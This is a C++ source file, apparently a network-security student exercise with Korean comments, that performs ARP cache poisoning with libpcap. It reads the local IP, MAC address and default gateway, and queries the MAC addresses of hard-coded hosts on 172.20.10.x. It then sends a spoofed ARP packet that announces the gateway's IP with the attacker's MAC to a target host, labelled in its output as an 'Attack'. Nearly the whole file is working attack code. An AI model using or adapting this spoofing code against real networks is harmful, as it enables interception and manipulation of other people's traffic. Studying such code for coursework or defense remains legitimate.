#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

// 기존의 libnet_arp_hdr 구조체를 사용
#pragma pack(push, 1)
struct ExtendedArpHdr :public libnet_arp_hdr{
    uint8_t ar_sha[ETHER_ADDR_LEN];        // Sender hardware address
    //uint8_t ar_sip[4];      // Sender protocol address
	in_addr ar_sip;
	
    uint8_t ar_tha[ETHER_ADDR_LEN];        // Target hardware address
    //uint8_t ar_tip[4];       // Target protocol address
	in_addr ar_tip; 
};

void print_mac_address(const uint8_t mac[6]) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
void find_my_ipmac(const char* dev, in_addr *my_ip, uint8_t my_mac[]){
	struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    if (fd < 0) {
        perror("socket");
        return;
    }

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        // MAC 주소를 sender_mac 배열에 저장
        for (int i = 0; i < 6; ++i) {
            my_mac[i] = (uint8_t) s.ifr_addr.sa_data[i];
        }
    } else {
        perror("ioctl");
    }

	    // IP 주소 찾기
    if (ioctl(fd, SIOCGIFADDR, &s) == 0) {
        // IP 주소를 my_ip에 저장
        *my_ip = ((struct sockaddr_in*)&s.ifr_addr)->sin_addr;
    } else {
        perror("ioctl");
    }

    close(fd);
};

void find_gateway_ip(char* dev, struct in_addr *gateway_ip){
	FILE* fp=NULL;
	char buff[100];
	uint8_t* temp_gateway_ip[4];
	fp = fopen("/proc/net/route", "r");
    if (fp == NULL) {
        perror("fopen");
        return;
    }
	while(fgets(buff, sizeof(buff), fp)!=0){
		char current_iface[16], destination[16], gateway[16];
        sscanf(buff, "%s %s %s", current_iface, destination, gateway);

        // Iface'wlan0' && Destination =='00000000'
        if (strcmp(current_iface, dev) == 0 && strcmp(destination, "00000000") == 0) {
			unsigned long gateway_addr = strtoul(gateway, NULL, 16);
            gateway_ip->s_addr = gateway_addr;
            break;  // 
        }
	}
	fclose(fp);
}

void make_send_packet(EthArpPacket &packet_send, uint8_t *eth_sender_mac, uint8_t *eth_target_mac, uint8_t *arp_sender_mac, in_addr sender_ip,  uint8_t *arp_target_mac, in_addr target_ip){
	packet_send.eth_.type_ = htons(EthHdr::Arp);
	packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet_send.arp_.pro_ = htons(EthHdr::Ip4);
	packet_send.arp_.op_ = htons(ArpHdr::Request);

	packet_send.arp_.hln_ = Mac::SIZE;
	packet_send.arp_.pln_ = Ip::SIZE;

	packet_send.eth_.dmac_ = Mac(eth_target_mac);//i dont know
	packet_send.eth_.smac_ = Mac(eth_sender_mac);//sender macc

	packet_send.arp_.smac_ = Mac(arp_sender_mac); //sender mac
	packet_send.arp_.sip_ = htonl(Ip(inet_ntoa(sender_ip))); //sender IP
	packet_send.arp_.tmac_ = Mac(arp_target_mac); //i dont know
	packet_send.arp_.tip_ = htonl(Ip(inet_ntoa(target_ip)));//target IP
}

void change_target_arp_table(pcap_t* handle,uint8_t *my_mac, in_addr gateway_ip, in_addr target_ip){
	EthArpPacket packet_send;
	printf("*****************Attck!!!***************\n");
	
	uint8_t broadlcast[6]= {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	uint8_t zero[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	make_send_packet(packet_send, my_mac, broadlcast, my_mac, gateway_ip, zero, target_ip);
	
	//send PAcket!!!!
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
	if (res != 0) {
	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
};

in_addr get_mac_address(pcap_t* handle, uint8_t *my_mac, in_addr my_ip, uint8_t *dest_mac, in_addr dest_ip){
	EthArpPacket packet_send;
	printf("******************request (%s)'s MAC**************\n", inet_ntoa(dest_ip));
	uint8_t broadlcast[6]= {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	uint8_t zero[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	make_send_packet(packet_send, my_mac, broadlcast, my_mac,my_ip,   zero, dest_ip);
	
	//send PAcket!!!!
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
	if (res != 0) {
	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return dest_ip;
};

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	//char* sender_ip = argv[2];
	//char* target_ip = argv[3];
	//printf("sender_ip: %s, target_ip: %s\n", argv[2], argv[3]);
	
	
	const char* sender_ip_str="172.20.10.2";
	const char* target_ip_str="172.20.10.14";

	int flag_send;
	//flag_send
	//1: find sender mac
	//2: find target mac
	//3: send arp table attack
	//4: let's start another attack
	struct in_addr my_ip, sender_ip, target_ip, gateway_ip, ip_of_new_addr;
	uint8_t my_mac[6], sender_mac[6], target_mac[6], new_mac_addr[6];;
	//타켓의 mac은 없어도 되지 않나?!?!?!?!

	//find_my_mac(dev, my_mac);
	printf("==============Basic Information================\n");
	find_my_ipmac(dev, &my_ip, my_mac);
	printf("My IP Address: %s\n", inet_ntoa(my_ip));
	printf("My Mac Address: ");
	print_mac_address(my_mac);
	find_gateway_ip(dev, &gateway_ip);
	printf("Gateway IP Address: %s\n", inet_ntoa(gateway_ip));
	printf("===============================================\n");

	//loop Start! ==========================================================
	printf("\n===============!ARP Table attctk Start!==================\n");
	flag_send=1;//1: find sender mac
	
	inet_pton(AF_INET, sender_ip_str, &sender_ip);
	inet_pton(AF_INET, target_ip_str, &target_ip);

	printf("Sender IP Address: %s\n", inet_ntoa(sender_ip));
	if (sender_ip.s_addr==my_ip.s_addr){ //or already in ip_set
		printf("--sender_ip==my_ip ---->  skip the find of sender's MAC address\n");
		flag_send=2;	//2: find target mac
	}
	printf("Target IP Address: %s\n", inet_ntoa(target_ip));
	if (target_ip.s_addr==my_ip.s_addr){ //or already in ip_set
		printf("--target_ip==my_ip ----> skip the find of target's MAC address\n");
		flag_send=3;	//3: send arp table attack
	}
	
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet_send;
	struct pcap_pkthdr* header;
	int res;
	const u_char* packet_receive;


	while (1) {
		if(flag_send){//flag == 0: 수신만 기능
			if(flag_send==1){//get sender, target's mac address
				printf("request sender's MAC\n");
				get_mac_address(handle,my_mac, my_ip, sender_mac, sender_ip);
			} else if(flag_send==2){
				printf("request target's MAC\n");
				get_mac_address(handle,my_mac, my_ip, target_mac, target_ip);
			} else if(flag_send==3){
				printf("Attack!!\n");
				change_target_arp_table(handle,my_mac, gateway_ip, target_ip);
				flag_send=4;
			} else if(flag_send==4){
				printf("Attack is finished!");
				return 0;
			}
		}

		
		res = pcap_next_ex(handle, &header, &packet_receive);
		if (res == 0) continue; 
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		//printf("arp hdr size: %d\n", sizeof(struct libnet_arp_hdr));//8

		printf("%u bytes captured\n", header->caplen);
		
		struct libnet_ethernet_hdr* ethernet_hdr = (struct libnet_ethernet_hdr*)packet_receive;
		
		    //ether_type=ARP 
        if (ntohs(ethernet_hdr->ether_type) == 0x806) {
            //struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + sizeof(struct libnet_ethernet_hdr));
            struct ExtendedArpHdr* arp_hdr = (struct ExtendedArpHdr*)(packet_receive+ sizeof(struct libnet_ethernet_hdr));
			//arp_her
            if ((ntohs(arp_hdr->ar_op) ==2)) {//check ip too//&&(arp_hdr->ar_sip==sender_ip)
				
				
				memcpy(new_mac_addr, arp_hdr->ar_sha, sizeof(new_mac_addr));
				ip_of_new_addr= arp_hdr->ar_sip;
				printf("IP(%s) =>  ", inet_ntoa(ip_of_new_addr));
    			print_mac_address(new_mac_addr);
				
				flag_send=3;
				//exit(0);
            }
		}
	}
	pcap_close(handle);
}
